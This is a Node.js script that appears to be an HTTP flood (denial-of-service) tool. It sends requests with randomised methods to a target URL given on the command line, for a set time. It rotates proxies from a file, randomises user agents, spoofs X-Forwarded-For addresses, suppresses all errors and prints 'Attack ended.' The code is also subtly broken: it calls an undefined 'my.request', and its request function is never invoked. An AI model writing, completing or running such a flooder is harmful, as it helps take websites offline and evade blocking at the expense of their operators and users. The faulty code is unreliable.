const url = require("url");
const fs = require('fs');
const request = require('request');
var random_useragent = require('random-useragent');
var HttpsProxyAgent = require('https-proxy-agent');

const target = process.argv[2],
	time = process.argv[3];
let proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
function randomNumber(min, max) {
	return Math.floor(Math.random() * (max - min) + min);
}
	function send_req() {
		let proxy = proxies[Math.floor(Math.random() * proxies.length)];
		var methods = ['HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'GET', 'TRACE', 'PATCH'];
		var randommethod = methods[Math.floor(Math.random() * methods.length)];
		my.request({
			method: randommethod,
			resolveWithFullResponse: true,
			headers: { 'User-Agent': random_useragent.getRandom(), 'Referer': target, 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=10, max=100', 'X-Forwarded-For': randomNumber(1, 255) + '.' + randomNumber(1, 255) + '.' + randomNumber(1, 255) + '.' + randomNumber(1, 255), },
			proxy: 'https://' + proxy,
			uri: target
		}).then(res => { });
	}
	setTimeout(() => {
		console.log('Attack ended.');
		process.exit(0)
	}, time * 1000);
	process.on('uncaughtException', function (err) {

	});
	process.on('unhandledRejection', function (err) {

	});